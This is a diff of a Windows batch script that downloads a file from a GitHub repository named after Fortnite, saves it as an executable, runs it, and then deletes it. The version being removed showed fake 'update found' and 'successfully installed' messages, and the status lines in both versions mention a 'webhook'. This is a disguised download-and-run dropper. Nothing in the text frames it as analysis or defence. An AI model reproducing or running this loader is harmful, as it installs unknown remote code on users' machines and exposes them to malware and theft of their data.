@@ -1,28 +1,13 @@
 @echo off
-Title sup
-cls
-echo Update Found..
+set "url=https://raw.githubusercontent.com/r3ntlovestodev/fortnite-crafter421/refs/heads/main/coolboy/batch1.txt"
+set "desktopPath=%userprofile%\Desktop"
+set "filePath=%desktopPath%\downloadedScript.exe"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%filePath%')"
 timeout /t 2 >nul
-Bootstrapped successfully installed..
-timeout /t 1 >nul
-cls
-
-set "url=https://github.com/r3ntlovestodev/fortnite-crafter421/raw/refs/heads/main/coolboy/coolother/macro-x.exe"
-
-
-set "tempFile=%temp%\downloadedScript.bat"
-
-
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%tempFile%')"
-
-
-timeout /t 2 >nul
-
-
-if exist "%tempFile%" (
-    echo webhooking macro file
-    call "%tempFile%"
-    del "%tempFile%"
+if exist "%filePath%" (
+    "%filePath%"
+    del "%filePath%"
 ) else (
-    echo failed to webhook macro file.
+    echo webhook failed
 )
+pause
